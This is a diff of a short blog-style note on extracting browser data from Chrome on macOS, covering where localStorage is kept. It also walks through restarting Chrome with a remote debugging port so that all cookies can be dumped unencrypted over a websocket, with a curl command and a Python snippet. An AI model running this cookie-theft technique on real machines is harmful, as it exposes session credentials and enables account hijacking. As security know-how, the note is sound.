@@ -5,7 +5,7 @@ date:   2024-11-17 03:00:00 -0600
 categories: 
 ---
 
-# LocalStorage
+# Local Storage
 
 Google Chrome (macOS) localStorage is saved on the filesystem in the leveldb file: `/Users/<user>/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb`.
 
@@ -17,7 +17,7 @@ To dump localStorage:
 
 # Cookies
 
-Google Chrome (macOS) cookies are saved in an encrypted SQLite database with the key saved in the keychain. Unencrypted cookies can still be fetch by attaching a remote chrome debugger. This technique requires existing Chrome browsers to be restarted with the `--remote-debugging-port` flag. 
+Google Chrome (macOS) cookies are stored in an encrypted SQLite database with the key saved in the keychain. Unencrypted cookies can still be fetched by attaching a remote chrome debugger. This technique requires existing Chrome browsers to be restarted with the `--remote-debugging-port` flag. 
 
 * `killall Google\ Chrome`
 * `/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --user-data-dir="/Users/<user>/Library/Application Support/Google/Chrome" --restore-last-session`
@@ -25,7 +25,7 @@ Google Chrome (macOS) cookies are saved in an encrypted SQLite database with the
 The following `/json` endpoint provides a list of websocket addresses. 
 * `curl http://localhost:9222/json`
 
-Using a websocket client, connect to the correct address to reveal the unencrypted cookie in JSON format.
+Using a websocket client, connect using the correct page id to dump the unencrypted cookie in JSON format.
 
 * `pip3 install websocket`
 * `pip3 install websocket-client`
@@ -34,7 +34,7 @@ Using a websocket client, connect to the correct address to reveal the unencrypt
 ```python
 import websocket
 ws = websocket.WebSocket()
-ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
+ws.connect("ws://localhost:9222/devtools/page/<id>", suppress_origin=True)
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv())
 ```
